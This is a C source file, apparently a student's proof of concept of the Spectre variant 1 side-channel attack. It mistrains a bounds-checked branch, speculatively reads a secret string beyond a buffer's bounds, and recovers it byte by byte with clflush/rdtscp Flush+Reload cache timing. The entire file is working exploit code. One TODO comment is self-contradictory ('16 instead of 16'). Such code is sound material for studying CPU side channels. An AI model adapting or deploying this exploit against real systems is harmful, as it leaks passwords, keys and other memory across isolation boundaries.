#include <stdio.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>

#define clflush(_addr) asm volatile("clflush (%0)" : : "r" (_addr));

#define measure_time(_time, _addr) asm volatile(\
				"mfence\n"\
				"rdtscp\n"\
				"mov %%rax, %%r10\n"\
				"mov (%1), %%rcx\n"\
				"rdtscp;\n"\
				"sub %%r10, %%rax\n"\
				: "=a"(_time)\
				: "b"(_addr)\
				: "rcx", "r10");

#define clflush_array(_array)\
	for (int j = 0; j < 256; j++)\
	{\
		clflush(&_array[j * 4096]);\
	};\
	asm volatile("mfence");

// To avoid fetching previous line
#define DELTA 1024
#define CACHE_HIT_THRESHOLD 120
#define ITERATION 100

uint8_t temp = 0;
int bufferSize = 16;
// TODO
// If we declare buffer size as 16 instead of 16, it works, but with lower resolution
// WHY?
uint8_t buffer[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
// TODO
// If the secret is short, like below, Spectre won't work! WHY?
// char secret[] = "It's the secret.";
// unreachable but known address
char secret[] = "The Magic Words are Squeamish Ossifrage.";



void victim_function(uint8_t* array, size_t x){
	if(x < bufferSize){
		// read the array's element to temp
		temp &= array[buffer[x] * 4096];
	}
}

/**
 * Finds cached entry of the array
 * Iterates over 256 entries to find latencies smaller than threshold
 */
void find_cached_index(uint8_t* array, int* scores){

	uint64_t time_dif;
	for (int i = 0; i < 256; i++)
	{
		time_dif = 0;
		measure_time(time_dif, &array[i * 4096]);

		if(time_dif < CACHE_HIT_THRESHOLD){
			scores[i]++;
		}
	}
}

/**
 * Train the victim function
 */
void train_victim(uint8_t* array){
	int i;
	for (i = 0; i < 20; i++){
		victim_function(array, i % 10);
		clflush_array(array);
		clflush(&bufferSize);
	}
}

/**
 * Finds highest score in the scores array
 */
void find_highest_score(int* scores){
	int maxScore = 0;
	int maxIndex = 0;
	int i;
	for (i = 1; i < 256; i++)
	{
		if(scores[i] > maxScore){
			maxIndex = i;
			maxScore = scores[i];
		}
	}
	printf("Letter: %c\t Index: %d\t number of hits:%d\n", maxIndex, maxIndex, maxScore);
}

/**
 * Reads one byte from the out of bounds of the buffer
 */
void steal_byte(uint8_t* array, int byteindex){

	clflush_array(array);

	// out of bounds access
	size_t larger_x = (size_t)(secret - (char*)buffer + byteindex);

	// initialize scores
	int* scores =(int*) malloc(256 * sizeof(int));
	for (int i = 0; i < 256; i++)
	{
		scores[i] = 0;
	}

	// do the experiment 1000 Times
	for(int it = 0; it < 1000; it++){

		train_victim(array);
		// access to the array speculatively
		victim_function(array, larger_x);

		find_cached_index(array, scores);
	}
	find_highest_score(scores);
	free(scores);
}


int main(){
	uint8_t * array = (uint8_t *) malloc(4096 * 256 * sizeof(uint8_t));

	// initialize the array
	for (int i = 0; i < 256 * 4096; i++){
		array[i] = i % 256;
	}
	// steal the secret, secret is 40 byte long
	for(int i =0; i < 40; i++){
		steal_byte(array, i);
	}

	free(array);
	return 0;
}
